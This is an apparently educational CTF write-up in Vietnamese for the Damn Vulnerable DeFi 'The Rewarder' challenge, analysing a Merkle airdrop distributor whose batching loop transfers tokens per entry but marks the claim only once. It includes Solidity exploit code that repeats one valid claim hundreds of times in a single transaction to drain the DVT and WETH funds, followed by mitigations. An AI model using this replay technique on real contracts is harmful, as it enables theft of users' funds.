---
title: "[DVD-05] The Rewarder: claim lặp cùng một Merkle proof để rút cạn quỹ airdrop"
description: "claimRewards() của TheRewarderDistributor chỉ kiểm tra và đánh dấu trạng thái 'đã claim' một lần cho cả chuỗi claim liên tiếp cùng token, nhưng lại chuyển token không điều kiện cho từng entry. Player — một beneficiary hợp lệ — lặp lại claim của chính mình hàng trăm lần trong một giao dịch để rút gần như toàn bộ quỹ DVT và WETH."
pubDate: 2026-08-21
tags: ["web3", "ctf", "smart-contract", "damn-vulnerable-defi", "merkle-airdrop", "claim-replay", "check-effects-interactions"]
draft: false
challenge: "damn-vulnerable-defi"
difficulty: "easy"
series: "damn-vulnerable-defi"
---

## Tóm tắt

TheRewarderDistributor phân phối airdrop theo Merkle proof. Lỗ hổng nằm trong vòng lặp `claimRewards()`: trạng thái "đã claim" (bitmap) chỉ được kiểm tra và cập nhật khi đổi token hoặc ở entry cuối cùng, trong khi lệnh chuyển token chạy **không điều kiện cho từng entry**. Vì player là một beneficiary hợp lệ trong danh sách (index 188), player chỉ cần lặp lại claim hợp lệ của chính mình nhiều lần liên tiếp trong một lần gọi — mỗi lần đều được trả tiền, còn bitmap chỉ ghi nhận "đã claim" đúng một lần. Kết quả: rút gần như toàn bộ quỹ DVT (10 ether) và WETH (1 ether) về recovery.

## Bối cảnh & Mục tiêu

**TheRewarderDistributor** (`src/the-rewarder/TheRewarderDistributor.sol`) quản lý nhiều distribution, mỗi distribution có batch (Merkle root), số token còn lại (`remaining`) và bitmap `claims` theo từng claimer. Hàm `claimRewards()` (dòng 81–118) nhận mảng `inputClaims` và mảng `inputTokens` để gộp nhiều claim trong một giao dịch:

```solidity
for (uint256 i = 0; i < inputClaims.length; i++) {
    inputClaim = inputClaims[i];
    uint256 wordPosition = inputClaim.batchNumber / 256;
    uint256 bitPosition = inputClaim.batchNumber % 256;

    if (token != inputTokens[inputClaim.tokenIndex]) {
        if (address(token) != address(0)) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }
        token = inputTokens[inputClaim.tokenIndex];
        bitsSet = 1 << bitPosition;
        amount = inputClaim.amount;
    } else {
        bitsSet = bitsSet | 1 << bitPosition;
        amount += inputClaim.amount;
    }

    // for the last claim
    if (i == inputClaims.length - 1) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
    }

    bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
    bytes32 root = distributions[token].roots[inputClaim.batchNumber];
    if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

    inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
}
```

Trạng thái ban đầu (`test/the-rewarder/TheRewarder.t.sol`): hai distribution đang hoạt động — DVT (tổng 10 ether, 1000 beneficiary) và WETH (tổng 1 ether). Alice (index 2) đã claim phần của mình. Player là beneficiary hợp lệ index 188 với quyền claim `11524763827831882` DVT và `1171088749244340` WETH.

Điều kiện thắng (`_isSolved()`): distributor chỉ còn lại số dư không đáng kể (dust balance `< 1e16` DVT, `< 1e15` WETH); toàn bộ phần còn lại nằm ở recovery.

## Phân tích lỗ hổng

Vòng lặp được tối ưu để gộp các claim **cùng token liên tiếp** thành một lần cập nhật bitmap. Nhưng logic đó có hai giả định sai:

1. **Bitmap chỉ được cập nhật ở điểm chuyển token hoặc entry cuối.** `_setClaimed` (dòng 120–129) set một bit theo `wordPosition` (batch/256) và kiểm tra xung đột với `currentWord`. Với batch 0, chỉ có bit 0 của word 0 được dùng — nên nếu hai claim **cùng token, cùng batch, cùng người** đứng liền nhau, chúng chỉ đóng góp vào cùng một bit và bit đó chỉ được set **một lần** ở cuối chuỗi.

2. **Transfer chạy không điều kiện cho mọi entry** (dòng 116): `inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount)`. Không có bất kỳ kiểm tra "entry này đã claim chưa" nào trước khi chuyển tiền.

Hệ quả: với n claim giống hệt nhau (cùng `msg.sender`, cùng `amount`, cùng `proof`, cùng token, cùng batch 0) xếp liên tiếp, vòng lặp sẽ verify cùng một proof n lần (luôn hợp lệ vì leaf = `keccak256(msg.sender, amount)` không đổi), chuyển `n × amount` cho attacker, nhưng `_setClaimed` chỉ chạy đúng một lần và chỉ set một bit. Lần gọi sau đó (tx khác) vẫn bị chặn bởi `AlreadyClaimed` — nhưng thiệt hại trong chính giao dịch này đã xảy ra n lần.

Đây là vi phạm **check-effects-interactions**: effect (transfer) thực hiện trước khi state (bit claimed, `remaining`) được cập nhật đầy đủ, và việc cập nhật state không tương ứng 1-1 với từng lần chuyển tiền.

## Khai thác

Trong một lần gọi `claimRewards()`, player dựng mảng claim gồm `nDvt` bản sao claim DVT của mình rồi đến `nWeth` bản sao claim WETH, với số lần lặp tính từ số token còn lại trong distributor:

```solidity
uint256 remainingDvt = distributor.getRemaining(address(dvt));
uint256 remainingWeth = distributor.getRemaining(address(weth));
uint256 nDvt = remainingDvt / playerDvtAmount;   // 867 lần
uint256 nWeth = remainingWeth / playerWethAmount; // 853 lần

Claim[] memory claims = new Claim[](nDvt + nWeth);
for (uint256 i = 0; i < nDvt; i++) {
    claims[i] = Claim({batchNumber: 0, amount: playerDvtAmount, tokenIndex: 0, proof: dvtProof});
}
for (uint256 i = 0; i < nWeth; i++) {
    claims[nDvt + i] = Claim({batchNumber: 0, amount: playerWethAmount, tokenIndex: 1, proof: wethProof});
}

distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
```

- 867 claim DVT liên tiếp: chỉ entry cuối của chuỗi DVT (điểm chuyển sang WETH) chạy `_setClaimed` — set bit 0, trừ `remaining` đúng một lần theo tổng. Nhưng 867 lệnh transfer đều thực thi.
- 853 claim WETH liên tiếp: tương tự, entry cuối cùng của mảng chạy `_setClaimed` lần hai.
- Tổng cộng player nhận `867 × 11524763827831882` DVT và `853 × 1171088749244340` WETH, đủ để `remaining` chỉ còn lại phần dư nhỏ hơn một lần claim — nằm dưới ngưỡng dust balance của `_isSolved()`. Cuối cùng player chuyển toàn bộ số token nhận được về `recovery`.

## Kết quả

Chạy `forge test --match-contract TheRewarderChallenge -vv`:

```
Ran 2 tests for test/the-rewarder/TheRewarder.t.sol:TheRewarderChallenge
[PASS] test_assertInitialState() (gas: 61573)
[PASS] test_theRewarder() (gas: 34686712)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## Bài học & Cách phòng tránh

- **Cập nhật state trước mỗi effect.** Mỗi lần chuyển token phải đi kèm một lần kiểm tra + set bit claimed tương ứng (check-effects-interactions), không gộp nhiều entry vào một lần cập nhật rồi mới chuyển tiền hàng loạt.
- **Gắn token và batch vào leaf.** `leaf = keccak256(msg.sender, amount)` không ràng buộc token hay batch; một proof của distribution này về lý thuyết có thể được tái sử dụng ở nơi có root khớp. Leaf nên là `keccak256(msg.sender, token, batchNumber, amount)`.
- **Kiểm tra `remaining` đủ trước khi transfer** và trừ `remaining` theo từng claim thực tế, tránh trường hợp trả nhiều hơn số còn lại hoặc trả tiền dù state đã cạn.
- **Giới hạn số claim mỗi giao dịch** hoặc dùng nonce/claim id để chống replay ngay cả trong cùng một tx.

## Tham khảo

- Challenge: [The Rewarder — Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)
- Source: `src/the-rewarder/TheRewarderDistributor.sol`, `test/the-rewarder/TheRewarder.t.sol`, `test/the-rewarder/dvt-distribution.json`, `test/the-rewarder/weth-distribution.json`
